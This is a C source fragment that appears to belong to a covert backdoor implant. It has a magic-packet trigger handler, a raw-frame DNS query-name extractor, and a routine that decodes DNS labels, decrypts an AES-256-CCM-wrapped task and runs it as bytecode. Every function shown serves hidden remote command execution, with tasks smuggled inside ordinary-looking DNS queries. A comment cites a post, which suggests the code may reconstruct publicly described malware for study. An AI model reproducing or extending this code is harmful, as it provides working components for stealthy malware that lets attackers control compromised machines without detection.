/* ------------------------------------------------------------------ */
/* Trigger dispatch                                                    */
/* ------------------------------------------------------------------ */
int sw_handle_raw_packet(const uint8_t *pkt, uint32_t len) {
    uint8_t task[4096];
    uint32_t tlen;
    if (!sw_magic_packet_check(pkt, len, task, sizeof task, &tlen)) {
        sw_dbg("raw: magic check REJECTED pkt len=%u", len);
        return 0;
    }
    sw_dbg("raw: magic check ACCEPTED len=%u tlen=%u", len, tlen);
    return sw_run_bytecode(task, tlen) ? 1 : 0;
}

/*
 * Extract the question name (qname) from a DNS A-query packet.
 *
 * The frame is [..][DNS header (12)][qname][QTYPE][QCLASS]. We scan the
 * buffer for a position whose <len><chars>...0x00 run is a well-formed
 * qname (1..63 total qname length, labels 1..63 bytes), then copy the
 * uncompressed name (NUL-terminated) to `qname`. This scan is robust to
 * variable-length IP/UDP headers prefixing the DNS header.
 *
 * Returns the length of the extracted qname, or -1 if not found.
 */
int sw_extract_dns_qname(const uint8_t *pkt, uint32_t pkt_len,
                          char *qname, uint32_t cap) {
    /* The raw packet starts with L2/IP/UDP framing, so the DNS header is not
     * at a fixed offset. A valid trigger must carry a standard DNS question
     * header - exactly one question (QDCOUNT=1) and no answer, authority or
     * additional records (AN/NS/ARCOUNT=0). This matches the post: "Nothing
     * else in the header is examined." Scan for that header, then parse the
     * qname that follows it. */
    for (uint32_t s = 0; s + 12 < pkt_len; s++) {
        if (rd16(pkt + s + 4) != 1) continue;              /* QDCOUNT == 1 */
        if (rd16(pkt + s + 6) != 0 || rd16(pkt + s + 8) != 0
            || rd16(pkt + s + 10) != 0) continue;          /* AN/NS/AR == 0 */
        const uint8_t *p = pkt + s + 12;
        const uint8_t *end = pkt + pkt_len;
        uint32_t out = 0;
        int first_label = 1;
        int ok = 1;
        while (p < end && *p != 0) {
            uint8_t lbl = *p;
            if (lbl > 63) { ok = 0; break; }
            p++;
            if (p + lbl > end) { ok = 0; break; }
            if (out + lbl + 2 >= cap) { ok = 0; break; }
            if (!first_label) qname[out++] = '.';
            for (uint32_t i = 0; i < lbl; i++)
                qname[out++] = (char)p[i];
            first_label = 0;
            p += lbl;
        }
        if (!ok || p >= end || *p != 0) continue;          /* must end 0x00 */
        if (out < 4 || out >= 64) continue;
        qname[out] = '\0';
        sw_dbg("dns: extracted qname len=%u", out);
        return (int)out;
    }
    return -1;
}

int sw_handle_dns_query(const char *qname, uint32_t qname_len) {
    const char *p = qname;
    const char *end = qname + qname_len;
    while (p < end && *p) {
        const char *n = p;
        while (n < end && *n != '.') n++;
        uint32_t lbl_len = (uint32_t)(n - p);
        uint8_t env[256]; uint32_t env_len;
        if (sw_dns_label_decode(p, lbl_len, env, sizeof env, &env_len) && env_len >= 11) {
            uint32_t ct_len = env_len - 11;
            uint8_t task[4096], check[4];
            if (sw_aes256_ccm_open(env, 7, env + 11, ct_len, task, check, 4) == 0
                && memcmp(check, env + 7, 4) == 0) {
                sw_dbg("dns: decoded task ct_len=%u", ct_len);
                return sw_run_bytecode(task, ct_len) ? 1 : 0;
            }
        }
        if (n >= end) break;
        p = n + 1;
    }
    sw_dbg("dns: no matching label (qname='%.40s' len=%u)", qname, qname_len);
    return 0;
}
